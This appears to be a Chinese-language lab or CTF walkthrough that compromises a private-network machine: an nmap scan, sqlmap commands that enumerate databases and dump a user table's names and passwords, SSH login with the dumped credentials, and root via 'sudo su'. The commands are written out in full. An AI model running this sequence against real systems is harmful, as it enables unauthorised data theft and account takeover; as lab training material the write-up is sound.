
# 0X00 环境
攻击机IP：192.168.1.10<br />目标机IP：192.168.1.7


# 0X01 实战
使用NMAP扫描端口
```
nmap -Pn -sV -A 192.168.1.7
```
![](https://img-blog.csdnimg.cn/58ff468bd5d149338681018da98fac1e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=jFWFc&originHeight=502&originWidth=744&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到开放的端口有22-SSH、25-SMTP、80-HTTP。

既然开放了80端口，那当然是先去看看80端口<br />![](https://img-blog.csdnimg.cn/58f9fa3dc5e54ea5b9d1009f09508d3e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=qkps9&originHeight=536&originWidth=742&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在浏览网页的过程中发现可能存在SQL注入的一个URL
```
http://192.168.1.7/index.html?page=blog&title=Blog&id=2
```
![](https://img-blog.csdnimg.cn/62e36b4e0298481ba0b652254859ec76.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=DDsCU&originHeight=532&originWidth=894&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

使用SQLMAP扫描
```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2"
```

![](https://img-blog.csdnimg.cn/58495c6f003f4817b045d8d52851bc8c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=FPmUw&originHeight=509&originWidth=994&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

果然存在SQL注入

爆库
```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" --dbs
```

![](https://img-blog.csdnimg.cn/f5cf3c06be7b416f88126f0ea332158e.png#crop=0&crop=0&crop=1&crop=1&id=OEiKu&originHeight=194&originWidth=426&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在爆表的过程中发现在ehks库中存在user表
```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks --tables
```

![](https://img-blog.csdnimg.cn/a66729e065334195bf2c1e69df532951.png#crop=0&crop=0&crop=1&crop=1&id=QkRyz&originHeight=186&originWidth=557&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

爆表
```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks -T user --columns
```

![](https://img-blog.csdnimg.cn/6ce3af7ca51e4d898c911726921934aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=viTLU&originHeight=244&originWidth=712&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

爆user_name和user_pass字段
```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks -T user -C user_name,user_pass --dump
```

得到一些账号和密码<br />![](https://img-blog.csdnimg.cn/6e4d102f40b445c491768113822970e4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_18,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=a5yVa&originHeight=274&originWidth=654&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在前面的端口扫描中我们发现开放了22-SSH端口，尝试连接，连接成功！<br />![](https://img-blog.csdnimg.cn/b01025010a3844bd8c4164d73bbe48f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=qOubo&originHeight=206&originWidth=755&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看当前权限<br />![](https://img-blog.csdnimg.cn/bd648b7584f44fdf9b2662e3e091a050.png#crop=0&crop=0&crop=1&crop=1&id=MzGRO&originHeight=95&originWidth=1186&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到在这里我们只是普通用户的权限，尝试提权，输入：

```
sudo su
```
![](https://img-blog.csdnimg.cn/f47a4a09a41d4b10af92bee7b063a976.png#crop=0&crop=0&crop=1&crop=1&id=KNjvT&originHeight=88&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到我们成功的拿到了root权限。
